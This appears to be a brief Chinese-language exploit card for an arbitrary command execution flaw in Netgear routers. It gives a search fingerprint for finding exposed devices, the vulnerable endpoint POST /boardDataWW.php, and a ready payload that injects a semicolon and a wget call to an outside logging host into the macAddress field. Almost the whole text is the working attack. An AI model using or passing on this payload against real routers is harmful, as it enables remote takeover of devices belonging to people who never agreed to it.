# Netgear路由器任意命令执行漏洞

Netgear ｜ 命令执行 ｜ —
- **指纹**：`title=="Netgear"`
- **请求**：`POST /boardDataWW.php HTTP/1.1`

**Payload**
```
macAddress=112233445566%3Bwget+http%3A%2F%2Fdnslog.cn
```